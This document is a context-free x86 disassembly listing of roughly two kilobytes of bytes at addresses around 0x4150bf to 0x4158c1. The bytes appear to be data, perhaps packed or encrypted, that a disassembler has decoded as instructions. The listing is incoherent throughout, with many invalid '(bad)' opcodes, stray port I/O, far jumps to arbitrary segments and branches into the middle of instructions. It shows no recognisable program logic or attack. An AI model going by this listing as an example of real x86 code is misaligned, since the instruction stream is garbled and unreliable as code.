  4150bf:	sub    DWORD PTR [esi],edi
  4150c1:	hlt    
  4150c2:	in     al,0x73
  4150c4:	or     al,cl
  4150c6:	(bad)  
  4150c7:	clc    
  4150c8:	mov    esi,0xfc167568
  4150cd:	repz loop 0x4150b6
  4150d0:	es jg  0x41514d
  4150d3:	mov    edi,0x1df0b14c
  4150d8:	or     BYTE PTR [eax+edi*8+0x5604b447],cl
  4150df:	push   esi
  4150e0:	xchg   ebx,eax
  4150e1:	lock mov dl,0xb1
  4150e4:	push   ecx
  4150e5:	sbb    eax,0xd07e0a83
  4150ea:	test   DWORD PTR [edx+0x4586c9eb],esp
  4150f0:	into   
  4150f1:	(bad)
  4150f5:	test   al,0x15
  4150f7:	sub    DWORD PTR [esi+edi*4],eax
  4150fa:	pop    ecx
  4150fb:	aas    
  4150fc:	or     BYTE PTR [esi-0x504209d],al
  415102:	and    bl,BYTE PTR [edi-0x51910f76]
  415108:	jg     0x415106
  41510a:	std    
  41510b:	mov    ebx,DWORD PTR ds:0x54a91dd9
  415111:	add    DWORD PTR [esi-0x3cd0463b],0x17
  415118:	rcl    DWORD PTR [ecx-0x42],1
  41511b:	pop    edi
  41511c:	mov    al,ds:0x2fd587d5
  415121:	jne    0x415147
  415123:	push   esi
  415124:	sub    al,BYTE PTR [edx+0x69c6cb88]
  41512a:	jmp    0x666d3d6a
  41512f:	adc    esi,DWORD PTR [ebx]
  415131:	aam    0xc5
  415133:	sub    DWORD PTR [ecx],esp
  415135:	mov    ah,0x25
  415137:	pop    edi
  415138:	not    DWORD PTR [ebx+0x18f57c45]
  41513e:	sub    DWORD PTR [ebx+edi*1],edi
  415141:	icebp  
  415142:	mov    esi,0x4e8afe89
  415147:	sub    ah,ch
  415149:	mov    al,0xb2
  41514b:	mov    al,ds:0x578680de
  415150:	and    esi,DWORD PTR [esi]
  415152:	enter  0x733b,0x98
  415156:	pop    eax
  415157:	sub    DWORD PTR [esp+ebp*4],edx
  41515a:	mov    esi,0x6f6e1562
  41515f:	inc    ebx
  415160:	nop
  415161:	xor    al,cl
  415163:	lods   al,BYTE PTR ds:[esi]
  415164:	fnstenv [ecx+0x2c51402]
  41516a:	push   eax
  41516b:	daa    
  41516c:	call   DWORD PTR [eax]
  41516e:	mov    dh,0x92
  415170:	lahf   
  415171:	not    ebx
  415173:	mov    eax,ds:0x7fa3271f
  415178:	xchg   esi,eax
  415179:	jnp    0x415102
  41517b:	fwait
  41517c:	imul   edx,DWORD PTR [edx],0xfffffffe
  41517f:	loop   0x4151d2
  415181:	pushf  
  415182:	loope  0x4151e2
  415184:	xchg   ebx,eax
  415185:	lods   al,BYTE PTR ds:[esi]
  415186:	xchg   ch,bh
  415188:	mov    edx,0x994d4787
  41518d:	in     eax,0x86
  41518f:	sti    
  415190:	addr16 iret 
  415192:	mov    ebx,edx
  415194:	in     eax,dx
  415195:	fld    QWORD PTR [eax+ebp*1+0x39]
  415199:	jge    0x415123
  41519b:	in     al,0x8
  41519d:	push   cs
  41519e:	scas   eax,DWORD PTR es:[edi]
  41519f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a0:	mov    BYTE PTR [edi-0xf2f6cb9],ch
  4151a6:	push   ds
  4151a7:	jp     0x4151d3
  4151a9:	into   
  4151aa:	xor    BYTE PTR [ebx+0x77],cl
  4151ad:	push   ebp
  4151ae:	jbe    0x415192
  4151b0:	pop    edx
  4151b1:	xchg   DWORD PTR fs:[ebx+0x1162617],esi
  4151b8:	xor    DWORD PTR [ecx],edx
  4151ba:	les    ebp,FWORD PTR [eax]
  4151bc:	inc    esp
  4151bd:	in     al,dx
  4151be:	sub    DWORD PTR [ecx+0xe],ebp
  4151c1:	inc    edx
  4151c2:	push   edx
  4151c3:	xlat   BYTE PTR ds:[ebx]
  4151c4:	add    ah,BYTE PTR [ebx-0x73b94cc2]
  4151ca:	and    BYTE PTR [ecx+0x1c],cl
  4151cd:	neg    dl
  4151cf:	(bad)  [edx]
  4151d1:	cmc    
  4151d2:	ds dec esp
  4151d4:	stos   BYTE PTR es:[edi],al
  4151d5:	cmp    edx,DWORD PTR [edi-0x208d4005]
  4151db:	imul   esp,DWORD PTR [ebx+0x79],0xe598c586
  4151e2:	pop    es
  4151e3:	push   edi
  4151e4:	cdq    
  4151e5:	push   0x7f0929e1
  4151ea:	xchg   edi,eax
  4151eb:	mov    ch,0x9
  4151ed:	cmp    bl,dl
  4151ef:	out    dx,al
  4151f0:	and    DWORD PTR [ebx-0x7b10e960],eax
  4151f6:	sub    BYTE PTR [ebp-0x9],0x54
  4151fa:	sub    eax,0x766d6170
  4151ff:	fild   DWORD PTR [edi+0x270247a2]
  415205:	jns    0x41525e
  415207:	sub    DWORD PTR [eax+0x4cfc77ac],eax
  41520d:	sbb    ch,dh
  41520f:	shl    DWORD PTR [edi-0x7d7330c],cl
  415215:	adc    ah,BYTE PTR [esp+edi*4+0xb]
  415219:	call   0xb73f9453
  41521e:	daa    
  41521f:	adc    BYTE PTR [esi],cl
  415221:	jg     0x4151bd
  415223:	daa    
  415224:	in     al,dx
  415225:	into   
  415226:	inc    esi
  415227:	popf   
  415228:	jne    0x41521a
  41522a:	out    0xc0,al
  41522c:	fwait
  41522d:	push   edi
  41522e:	in     eax,0x3d
  415230:	loop   0x415223
  415232:	dec    ebx
  415233:	retf   
  415234:	sub    DWORD PTR [edi-0x332f6ff8],0x26
  41523b:	stos   BYTE PTR es:[edi],al
  41523c:	out    dx,eax
  41523d:	fwait
  41523e:	lods   eax,DWORD PTR ds:[esi]
  41523f:	pop    ebx
  415240:	adc    ch,bl
  415242:	cmp    BYTE PTR [ebp+0x2d11a8],0x8
  415249:	push   eax
  41524a:	jae    0x415211
  41524c:	sbb    dl,BYTE PTR [ebp-0x7c585eba]
  415252:	je     0x415289
  415254:	or     DWORD PTR [ecx-0x26781cfa],ecx
  41525a:	leave  
  41525b:	fincstp 
  41525d:	ja     0x415299
  41525f:	push   esi
  415260:	(bad)  
  415261:	out    dx,eax
  415262:	nop
  415263:	je     0x415265
  415265:	icebp  
  415266:	dec    esp
  415267:	cmc    
  415268:	push   ds
  415269:	add    al,0x20
  41526b:	dec    ebp
  41526c:	stos   DWORD PTR es:[edi],eax
  41526d:	das    
  41526e:	mov    ebx,0x875af932
  415273:	outs   dx,DWORD PTR ds:[esi]
  415274:	and    DWORD PTR [edx+0x8],edi
  415277:	popf   
  415278:	xchg   ecx,eax
  415279:	mov    al,0xf2
  41527b:	cs xchg edi,eax
  41527d:	scas   al,BYTE PTR es:[edi]
  41527e:	ror    BYTE PTR [esi+0x8],1
  415281:	popa   
  415282:	adc    DWORD PTR [esi],0xffffffa1
  415285:	lods   eax,DWORD PTR ds:[esi]
  415286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415287:	(bad)
  41528a:	xchg   DWORD PTR [ecx+0x3bf8035a],esi
  415290:	or     eax,0x63e544f0
  415295:	sub    ecx,DWORD PTR [ebp+0x19f42914]
  41529b:	ins    DWORD PTR es:[edi],dx
  41529c:	aam    0xe
  41529e:	sub    DWORD PTR [ebx+0x123f617e],0xbf48f036
  4152a8:	call   0x8cd:0x88b0
  4152ae:	ficom  DWORD PTR [ecx+0x44]
  4152b1:	rol    DWORD PTR [esi+0x5d539167],cl
  4152b7:	or     al,0x39
  4152b9:	push   edi
  4152ba:	push   0x29
  4152bc:	sbb    eax,0xf7483d36
  4152c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152c2:	rep outs dx,BYTE PTR ds:[esi]
  4152c4:	jmp    0x10f0:0xe06ea15f
  4152cb:	sub    eax,0x3a5035aa
  4152d0:	aad    0x4
  4152d2:	add    ebx,0xfffffff7
  4152d5:	pop    es
  4152d6:	inc    ebx
  4152d7:	fs sahf 
  4152d9:	rol    BYTE PTR [bx+si+0x118a],0x2f
  4152df:	add    al,0x7c
  4152e1:	daa    
  4152e2:	fnstenv [ecx+0x2979db35]
  4152e8:	inc    edi
  4152e9:	xchg   edx,edi
  4152eb:	loope  0x41532e
  4152ed:	sbb    dh,0xf9
  4152f0:	imul   edi
  4152f2:	pop    ds
  4152f3:	adc    DWORD PTR [esi+eax*1+0x2],edi
  4152f7:	(bad)  
  4152f8:	fwait
  4152f9:	jp     0x4152cf
  4152fb:	push   ebx
  4152fc:	pop    esp
  4152fd:	push   es
  4152fe:	xchg   DWORD PTR [ebx],edi
  415300:	nop
  415301:	and    ch,BYTE PTR [ecx]
  415303:	outs   dx,DWORD PTR ds:[esi]
  415304:	or     edx,edi
  415306:	pop    ebx
  415307:	mov    edx,0x8eeecee0
  41530c:	push   cs
  41530d:	lock xchg esi,eax
  41530f:	rcr    DWORD PTR [ecx-0x35],1
  415312:	inc    edx
  415313:	gs cmp eax,0x28ad6355
  415319:	test   al,0x87
  41531b:	rol    DWORD PTR [ecx],cl
  41531d:	jmp    0x26fb:0x69bba6cc
  415324:	or     DWORD PTR [esi+0x53],esi
  415327:	sub    al,0xd7
  415329:	in     eax,dx
  41532a:	ins    DWORD PTR es:[edi],dx
  41532b:	popa   
  41532c:	setp   BYTE PTR [edi+0x4]
  415330:	jbe    0x41530b
  415332:	sbb    al,0x82
  415334:	test   eax,eax
  415336:	js     0x4152e6
  415338:	xchg   edi,eax
  415339:	fbstp  TBYTE PTR [esi]
  41533b:	mov    edx,0x75737a08
  415340:	pop    ebx
  415341:	scas   eax,DWORD PTR es:[edi]
  415342:	jo     0x415332
  415344:	xor    cl,dh
  415346:	call   0x40676398
  41534b:	(bad)  [edx-0x42]
  41534e:	mov    eax,DWORD PTR [edi+esi*8-0x4f8e83f7]
  415355:	stos   DWORD PTR es:[edi],eax
  415356:	retf   
  415357:	ja     0x415332
  415359:	into   
  41535a:	mov    edx,0xe0ceae87
  41535f:	aas    
  415360:	imul   DWORD PTR [edx]
  415362:	xchg   edx,eax
  415363:	pop    esi
  415364:	add    BYTE PTR [edi+ebp*8],cl
  415367:	add    ah,BYTE PTR gs:[eax]
  41536a:	cmc    
  41536b:	test   BYTE PTR [eax],ah
  41536d:	imul   BYTE PTR [eax-0x79b091ee]
  415373:	pop    ebx
  415374:	ins    BYTE PTR es:[edi],dx
  415375:	icebp  
  415376:	sub    ch,cl
  415378:	mov    dh,0x8b
  41537a:	xor    ch,BYTE PTR [ecx-0x6]
  41537d:	cmc    
  41537e:	sti    
  41537f:	data16 add al,BYTE PTR [ecx+ecx*4-0xb]
  415384:	or     esp,esp
  415386:	ret    
  415387:	cmp    ch,0xfe
  41538a:	add    al,0x64
  41538c:	push   esi
  41538d:	and    eax,0x4cacc466
  415392:	jae    0x4153bb
  415394:	sbb    BYTE PTR [ecx-0x55f7f339],dl
  41539a:	std    
  41539b:	cmp    eax,0x341244f5
  4153a0:	sub    ecx,esi
  4153a2:	adc    al,0xf7
  4153a4:	jbe    0x415361
  4153a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a7:	lahf   
  4153a8:	or     ah,al
  4153aa:	or     ch,BYTE PTR [edx]
  4153ac:	arpl   WORD PTR [edx],ax
  4153ae:	xchg   DWORD PTR [edi-0x6e770423],esp
  4153b4:	adc    eax,0x9a28bad8
  4153b9:	mov    DWORD PTR [esi-0x44],eax
  4153bc:	or     dl,ah
  4153be:	(bad)  
  4153bf:	lds    esp,FWORD PTR [ebx+0x5930b2a4]
  4153c5:	test   BYTE PTR [eax],bh
  4153c7:	and    bh,BYTE PTR [edx-0x21]
  4153ca:	mov    eax,0x87e8b562
  4153cf:	jbe    0x41540b
  4153d1:	or     esp,DWORD PTR [ecx+0x2f]
  4153d4:	mov    bl,0x51
  4153d6:	test   DWORD PTR [edi-0x9b89f9a],esp
  4153dc:	push   esi
  4153dd:	lock pop esi
  4153df:	mov    ah,0x34
  4153e1:	sbb    BYTE PTR ds:0xae861e9,cl
  4153e7:	or     DWORD PTR [eax+0x904c250],ecx
  4153ed:	sbb    dh,BYTE PTR [edi-0x2f3cc142]
  4153f3:	lock push ds
  4153f5:	sbb    DWORD PTR [edx+0x64800916],esi
  4153fb:	sub    BYTE PTR [ecx+0x72f84596],cl
  415401:	and    al,BYTE PTR [ebx+0x967b1e9]
  415407:	sub    ecx,esp
  415409:	or     BYTE PTR [edi],al
  41540b:	sub    dh,bh
  41540d:	adc    DWORD PTR [esi-0x22],0xe0618908
  415414:	shl    BYTE PTR [esi+0x6f],cl
  415417:	dec    eax
  415418:	or     BYTE PTR [edx-0x38e9cfba],dl
  41541e:	inc    ecx
  41541f:	call   0xfebc:0xf1c8f122
  415426:	fcom   QWORD PTR [edi+0x4e]
  415429:	scas   eax,DWORD PTR es:[edi]
  41542a:	sub    eax,0x8705d599
  41542f:	xlat   BYTE PTR ds:[ebx]
  415430:	in     eax,0x92
  415432:	test   al,0xcf
  415434:	cmc    
  415435:	pushfw 
  415437:	sub    eax,ebp
  415439:	dec    ebx
  41543a:	lds    ecx,FWORD PTR [esi]
  41543c:	or     cl,BYTE PTR [ebp+eiz*1-0x5e]
  415440:	push   ebx
  415441:	push   es
  415442:	cmp    ebp,DWORD PTR [edi+0x57]
  415445:	mov    BYTE PTR [eax+eiz*2+0x5973af15],bh
  41544c:	cld    
  41544d:	cdq    
  41544e:	test   BYTE PTR [edx+eax*2],al
  415451:	adc    BYTE PTR [esi],dh
  415453:	out    0x8,eax
  415455:	pop    esi
  415456:	lods   al,BYTE PTR ds:[esi]
  415457:	mov    BYTE PTR [eax-0x36],dl
  41545a:	cli    
  41545b:	push   ecx
  41545c:	jge    0x41544e
  41545e:	or     dh,dh
  415460:	and    edi,edi
  415462:	mov    bh,BYTE PTR [eax+0x594aea92]
  415468:	mov    ebx,0x4a0d9834
  41546d:	push   ss
  41546e:	cld    
  41546f:	jmp    0x4ae44ce
  415474:	clc    
  415475:	lods   eax,DWORD PTR ds:[esi]
  415476:	cwde   
  415477:	jp     0x415426
  415479:	and    eax,0xc4084dd0
  41547e:	jb     0x4154d6
  415480:	cs pop ds
  415482:	mov    DWORD PTR [ebx],edx
  415484:	mov    bh,bh
  415486:	mov    esi,0xa84465b0
  41548b:	arpl   bp,si
  41548d:	xchg   ebx,eax
  41548e:	pop    es
  41548f:	das    
  415490:	jb     0x415508
  415492:	data16 mov WORD PTR [eax-0x53],fs
  415496:	xchg   ch,dh
  415498:	sbb    bh,ch
  41549a:	stos   DWORD PTR es:[edi],eax
  41549b:	in     eax,0x97
  41549d:	dec    eax
  41549e:	aad    0x28
  4154a0:	dec    edx
  4154a1:	and    ah,BYTE PTR [edi-0x49]
  4154a4:	jno    0x4154e0
  4154a6:	ja     0x4154ef
  4154a8:	mov    ds:0xd8347212,eax
  4154ad:	inc    eax
  4154ae:	pusha  
  4154af:	jmp    0x82705396
  4154b4:	or     eax,0x478fd5e2
  4154b9:	gs fsub st(0),st
  4154bc:	or     eax,edx
  4154be:	dec    esp
  4154bf:	ret    0xb5ac
  4154c2:	mov    fs,esi
  4154c4:	fdivrp st(1),st
  4154c6:	push   esi
  4154c7:	xchg   esp,eax
  4154c8:	cmp    dl,BYTE PTR [ebx]
  4154ca:	dec    ecx
  4154cb:	push   eax
  4154cc:	cmp    al,BYTE PTR [eax+edi*8-0x6a]
  4154d0:	ds xchg edx,eax
  4154d2:	xchg   BYTE PTR [ecx+0x6ed7be9d],bh
  4154d8:	xor    eax,0xc829f5ce
  4154dd:	inc    BYTE PTR [ecx+0xf300618]
  4154e3:	ins    DWORD PTR es:[edi],dx
  4154e4:	pusha  
  4154e5:	dec    edi
  4154e6:	jle    0x41551e
  4154e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e9:	sbb    eax,DWORD PTR [esi]
  4154eb:	popa   
  4154ec:	xchg   ebp,eax
  4154ed:	xor    ah,BYTE PTR [eax+ebp*1]
  4154f0:	xchg   esi,eax
  4154f1:	push   ecx
  4154f2:	arpl   WORD PTR [ebp-0x365e1df4],di
  4154f8:	icebp  
  4154f9:	push   es
  4154fa:	dec    ebx
  4154fb:	daa    
  4154fc:	int3   
  4154fd:	pop    eax
  4154fe:	ss jmp 0xc5d0458d
  415504:	in     eax,0x28
  415506:	mov    al,0x48
  415508:	outs   dx,BYTE PTR ds:[esi]
  415509:	add    ecx,DWORD PTR [ebp-0x788ecad1]
  41550f:	cmp    edx,DWORD PTR [ebx-0x10]
  415512:	cmc    
  415513:	test   al,0x8
  415516:	pop    eax
  415517:	jmp    0x4154fa
  415519:	inc    eax
  41551a:	daa    
  41551b:	jmp    0x388d:0x9046f3ed
  415522:	fstp   TBYTE PTR [ebx-0x6703b90]
  415528:	rcl    DWORD PTR [edi+eax*1+0x34],0xe8
  41552d:	hlt    
  41552e:	or     al,0x59
  415530:	std    
  415531:	mov    ch,0x59
  415533:	push   cs
  415534:	enter  0xec82,0x4c
  415538:	or     BYTE PTR [eax],al
  41553a:	adc    al,0xb3
  41553c:	sbb    DWORD PTR [ebp-0x2f],esi
  41553f:	jnp    0x415547
  415541:	lock shl BYTE PTR [esi+0x4b],1
  415545:	jmp    0x415542
  415547:	sub    al,0x89
  415549:	xor    bl,BYTE PTR [edi+0x1e]
  41554c:	mov    dh,0x19
  41554e:	xchg   BYTE PTR [ecx-0xa946557],al
  415554:	ja     0x415557
  415556:	ret    
  415557:	sub    DWORD PTR [eax-0x1157852e],ebx
  41555d:	outs   dx,BYTE PTR ds:[esi]
  41555e:	pushf  
  41555f:	pusha  
  415560:	dec    ebp
  415561:	fld    QWORD PTR [edi-0x7c58cf19]
  415567:	and    eax,0x29becf33
  41556c:	ja     0x41558d
  41556e:	or     ah,bh
  415570:	or     DWORD PTR [edx-0x35],esp
  415573:	aam    0x10
  415575:	rcr    BYTE PTR [esi],cl
  415577:	popa   
  415578:	dec    esp
  415579:	fidiv  WORD PTR [edx]
  41557b:	mul    BYTE PTR [edi-0xf]
  41557e:	lock pop edx
  415580:	popf   
  415581:	mov    bl,0xca
  415583:	mov    dl,0x7
  415585:	int3   
  415586:	push   ss
  415587:	icebp  
  415588:	jo     0x415604
  41558a:	retf   0xadca
  41558d:	add    BYTE PTR [esi-0x40],al
  415590:	jne    0x415604
  415592:	mov    ecx,0x109c636
  415597:	mov    bh,0x2a
  415599:	ret    0xe878
  41559c:	push   DWORD PTR [ecx+edi*1+0x26]
  4155a0:	sub    ebp,ebx
  4155a2:	xchg   DWORD PTR [ecx-0x25],ecx
  4155a5:	mov    edx,0xd95d2be2
  4155aa:	scas   al,BYTE PTR es:[edi]
  4155ab:	cs cmp al,0x24
  4155ae:	mov    ds:0x89490f31,eax
  4155b3:	dec    eax
  4155b4:	div    DWORD PTR [edi+0x14]
  4155b7:	je     0x4155e0
  4155b9:	sub    BYTE PTR [ebx+ecx*8-0x17af0e8a],dl
  4155c0:	ins    BYTE PTR es:[edi],dx
  4155c1:	fs inc ebx
  4155c3:	push   ebp
  4155c4:	popa   
  4155c5:	sbb    DWORD PTR [edx+0x57],edx
  4155c8:	jnp    0x4155cd
  4155ca:	xchg   ecx,ecx
  4155cc:	fstp   TBYTE PTR [ebx+0x4c]
  4155cf:	or     al,0xdd
  4155d1:	aas    
  4155d2:	ror    BYTE PTR [edi*8+0x529e2e8],1
  4155d9:	mov    ch,0xa9
  4155db:	mov    edi,0x9b8500ec
  4155e0:	dec    ecx
  4155e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155e2:	aas    
  4155e3:	jb     0x415589
  4155e5:	lock cs xchg edx,eax
  4155e8:	pop    eax
  4155e9:	aad    0xee
  4155eb:	adc    ebx,ebx
  4155ed:	clc    
  4155ee:	and    DWORD PTR [edi+0x6f860898],ebp
  4155f4:	icebp  
  4155f5:	jne    0x415606
  4155f7:	iret   
  4155f8:	push   esi
  4155f9:	icebp  
  4155fa:	loopne 0x4155d1
  4155fc:	jle    0x41566b
  4155fe:	mov    bh,0x4b
  415600:	fwait
  415601:	dec    ecx
  415602:	idiv   DWORD PTR [eax-0x1d]
  415605:	push   0xffffffab
  415607:	xchg   ebp,eax
  415608:	mov    ebx,0x37178738
  41560d:	lock jbe 0x415645
  415610:	in     al,0x6e
  415612:	hlt    
  415613:	lods   al,BYTE PTR ds:[esi]
  415614:	or     ebx,eax
  415616:	ret    0x1a70
  415619:	jge    0x4155a2
  41561b:	out    dx,eax
  41561c:	icebp  
  41561d:	bound  esp,QWORD PTR [esi]
  41561f:	fdivr  st(1),st
  415621:	mov    ch,0xb8
  415623:	sub    dh,dl
  415625:	mov    ebp,0xb5174592
  41562a:	sbb    DWORD PTR [ecx],esi
  41562c:	call   0x923cdac0
  415631:	sub    DWORD PTR [ecx+0x3f],eax
  415634:	inc    eax
  415635:	mul    BYTE PTR [esi+0x3b]
  415638:	xchg   esi,eax
  415639:	shl    BYTE PTR ds:0x76ed6868,0xe6
  415640:	cdq    
  415641:	mov    BYTE PTR [eax-0x15],dl
  415644:	push   ss
  415645:	jp     0x41564c
  415647:	ret    0x3030
  41564a:	aas    
  41564b:	data16 and bh,BYTE PTR [eax-0x63]
  41564f:	add    eax,0x28d07e6f
  415654:	cmc    
  415655:	repz mov edx,0x5ca609c7
  41565b:	stos   BYTE PTR es:[edi],al
  41565c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41565d:	aas    
  41565e:	ins    DWORD PTR es:[edi],dx
  41565f:	mov    bl,BYTE PTR [edi-0x10]
  415662:	hlt    
  415663:	add    ah,bh
  415665:	jecxz  0x4155f0
  415667:	inc    esp
  415668:	into   
  415669:	jl     0x415676
  41566b:	out    0xb0,eax
  41566d:	jnp    0x4155f6
  41566f:	rcl    DWORD PTR [edi+0x4bda2541],0xb2
  415676:	mov    esi,0xb3500128
  41567b:	je     0x415674
  41567d:	sub    ebp,ebx
  41567f:	bound  edx,QWORD PTR [eax+0x55]
  415682:	int3   
  415683:	pop    esp
  415684:	fcomi  st,st(0)
  415686:	mov    eax,0x5b102e35
  41568b:	call   0x44dbfb7e
  415690:	add    DWORD PTR ds:0xe7dd55b9,0xc464137e
  41569a:	push   es
  41569b:	xchg   esi,eax
  41569c:	dec    ecx
  41569d:	idiv   BYTE PTR [eax]
  41569f:	pushf  
  4156a0:	iret   
  4156a1:	std    
  4156a2:	inc    edx
  4156a3:	je     0x4156cd
  4156a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a6:	call   0xac151fa7
  4156ab:	stc    
  4156ac:	mov    ds:0x700786d9,al
  4156b1:	jae    0x4156ec
  4156b3:	call   0x610b:0x28c75875
  4156ba:	fild   DWORD PTR [ecx-0x1a]
  4156bd:	and    ah,BYTE PTR [edx-0x78042796]
  4156c3:	sbb    edx,ecx
  4156c5:	out    dx,al
  4156c6:	loope  0x4156e8
  4156c8:	in     al,0xf0
  4156ca:	ins    BYTE PTR es:[edi],dx
  4156cb:	sbb    ch,cl
  4156cd:	ins    BYTE PTR es:[edi],dx
  4156ce:	test   eax,0x13f03a37
  4156d3:	mov    ah,0xf
  4156d5:	jnp    0x41565d
  4156d7:	mov    bl,0xd0
  4156d9:	daa    
  4156da:	and    DWORD PTR [eax-0x352f019e],0x1c
  4156e1:	jo     0x4156ce
  4156e3:	pusha  
  4156e4:	rcr    BYTE PTR [edx+0xb],cl
  4156e7:	sub    edi,esi
  4156e9:	sti    
  4156ea:	dec    bp
  4156ec:	adc    DWORD PTR [esi],ebp
  4156ee:	xor    cl,BYTE PTR [eax]
  4156f0:	mov    ch,0xf2
  4156f2:	inc    edx
  4156f3:	ins    BYTE PTR es:[edi],dx
  4156f4:	sub    cl,ch
  4156f6:	outs   dx,DWORD PTR ds:[esi]
  4156f7:	ficom  DWORD PTR [eax+0x49aeb50c]
  4156fd:	mov    ds:0xc2ef0a47,al
  415702:	mov    eax,0x8695a85d
  415707:	test   BYTE PTR [ecx+0x21],ah
  41570a:	gs aaa 
  41570c:	mov    ds:0x46290c07,eax
  415711:	(bad)  
  415712:	out    0x23,eax
  415714:	or     DWORD PTR [eax],edx
  415716:	jle    0x4156de
  415718:	rol    BYTE PTR [ecx-0x305ed409],cl
  41571e:	inc    esi
  41571f:	xor    eax,0x53227188
  415724:	mov    ebx,0x9159fb8
  415729:	into   
  41572a:	rcr    BYTE PTR [esi-0x2827a7c0],0xa8
  415731:	mov    ecx,DWORD PTR [edx+0x577215d8]
  415737:	test   DWORD PTR [ebx-0x30096981],ecx
  41573d:	adc    DWORD PTR [ebp-0x71],edi
  415740:	adc    eax,0x1b1e61c4
  415745:	jno    0x4157b4
  415747:	mov    DWORD PTR [esi],0x95f57902
  41574d:	xchg   ebx,eax
  41574e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41574f:	sub    BYTE PTR [eax+0x57bafeb9],bl
  415755:	push   edx
  415756:	cmp    DWORD PTR [ebx-0x66010eb0],eax
  41575c:	push   0x56c48b36
  415761:	cmp    ch,BYTE PTR [esi-0x40372be8]
  415767:	lea    eax,[edi+eax*1+0x1]
  41576b:	mov    esi,0x38e3bffa
  415770:	aaa    
  415771:	push   eax
  415772:	xchg   edx,eax
  415773:	sub    DWORD PTR [ecx+0x20],esp
  415776:	inc    esp
  415777:	pop    esp
  415778:	add    eax,0x634d0a7e
  41577d:	aad    0xb1
  41577f:	xor    al,0xd
  415781:	outs   dx,DWORD PTR ds:[esi]
  415782:	fcom   st(4)
  415784:	loop   0x4157f6
  415786:	call   0x73b2693d
  41578b:	dec    ecx
  41578c:	inc    esp
  41578d:	les    ebp,FWORD PTR [esi+0x52]
  415790:	int3   
  415791:	or     eax,0x3c3e0bb8
  415796:	lea    eax,[ecx+0x154aa788]
  41579c:	int3   
  41579d:	icebp  
  41579e:	cwde   
  41579f:	enter  0xf455,0xe
  4157a3:	dec    esi
  4157a4:	mov    ah,0x98
  4157a6:	push   esi
  4157a7:	ins    DWORD PTR es:[edi],dx
  4157a8:	aaa    
  4157a9:	cmp    eax,0x7f102b86
  4157ae:	jecxz  0x415798
  4157b0:	xor    cl,0x9c
  4157b3:	iret   
  4157b4:	pop    ss
  4157b5:	push   esi
  4157b6:	loopne 0x4157fc
  4157b8:	fsubr  DWORD PTR [ecx-0x10]
  4157bb:	add    al,0x4a
  4157bd:	bnd jmp DWORD PTR [ecx-0x392b91f9]
  4157c4:	ja     0x415751
  4157c6:	inc    ecx
  4157c7:	pop    ds
  4157c8:	femms  
  4157ca:	mov    bh,0x29
  4157cc:	mov    BYTE PTR [edx+0x3e],cl
  4157cf:	inc    ecx
  4157d0:	or     DWORD PTR [esp+ecx*8+0x7eaa9495],ebx
  4157d7:	ja     0x4157b5
  4157d9:	icebp  
  4157da:	jp     0x4157f4
  4157dc:	mov    eax,0x1d16184e
  4157e1:	mov    bh,0x10
  4157e3:	shl    BYTE PTR [ecx],1
  4157e5:	adc    DWORD PTR [esi+0x446ae139],eax
  4157eb:	inc    eax
  4157ec:	jg     0x41577a
  4157ee:	sub    DWORD PTR [eax],ebp
  4157f0:	inc    ecx
  4157f1:	jns    0x415827
  4157f3:	jle    0x41580f
  4157f5:	fsub   QWORD PTR [ecx]
  4157f7:	mov    edx,0x7ad3f05b
  4157fc:	retf   0x3415
  4157ff:	sahf   
  415800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415801:	cli    
  415802:	(bad)  
  415803:	sub    DWORD PTR [edx],ecx
  415805:	leave  
  415806:	in     al,dx
  415807:	dec    esi
  415808:	in     eax,0x3b
  41580a:	jae    0x4157e1
  41580c:	and    eax,0xcd698882
  415811:	pop    es
  415812:	es push ss
  415814:	gs and eax,0xeb888bad
  41581a:	pop    es
  41581b:	or     ecx,DWORD PTR ds:0x42292f83
  415821:	xchg   esi,ecx
  415823:	pop    ebp
  415824:	fnstenv [ebx]
  415826:	fisub  DWORD PTR [edi+0x7f874a10]
  41582c:	sub    eax,0x44d73a4b
  415831:	aam    0x3
  415833:	mov    BYTE PTR [edi+0x1e281c4f],ch
  415839:	or     eax,0xc608f1fd
  41583e:	cwde   
  41583f:	push   edi
  415840:	std    
  415841:	xor    BYTE PTR [eax+ebx*1-0x5c4bf8be],dh
  415848:	leave  
  415849:	icebp  
  41584a:	pop    edx
  41584b:	shr    DWORD PTR [ebx],0xf
  41584e:	dec    esi
  41584f:	xlat   BYTE PTR ds:[ebx]
  415850:	mov    al,0xbc
  415852:	aam    0xe5
  415854:	or     ebp,esi
  415856:	test   BYTE PTR [edi-0x7b2db9e7],cl
  41585c:	mov    ecx,0x978366f1
  415861:	daa    
  415862:	xor    al,0x16
  415864:	add    ah,BYTE PTR [edi+edx*1]
  415867:	cmp    al,0xea
  415869:	jp     0x4157fa
  41586b:	test   eax,0xbbf14388
  415870:	mov    esi,0x23c14af0
  415875:	pop    esi
  415876:	mov    bl,0x9a
  415878:	sub    eax,0x44cb8d0d
  41587d:	cmp    DWORD PTR [eax-0x7a94df6b],ebp
  415883:	test   eax,0x2069b068
  415888:	popa   
  415889:	imul   edx,esi,0x55
  41588c:	fucomi st,st(7)
  41588e:	xchg   DWORD PTR [ecx+0x47],eax
  415891:	clc    
  415892:	push   esp
  415893:	enter  0x3a65,0x86
  415897:	icebp  
  415898:	fsub   DWORD PTR [ebx-0x45]
  41589b:	mov    eax,ds:0x283e0ae7
  4158a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a1:	add    ebp,0x38
  4158a4:	or     BYTE PTR [esi+0x29de7dd],ch
  4158aa:	fs dec ebp
  4158ac:	ret    
  4158ad:	pop    ss
  4158ae:	push   esi
  4158af:	jmp    0x156168f3
  4158b4:	mov    esp,0x44273083
  4158b9:	push   ecx
  4158ba:	or     esp,edi
  4158bc:	imul   esp,eax,0x65
  4158bf:	pop    esi
  4158c0:	dec    esi
  4158c1:	mov    al,BYTE PTR [edi+0x624f0351]
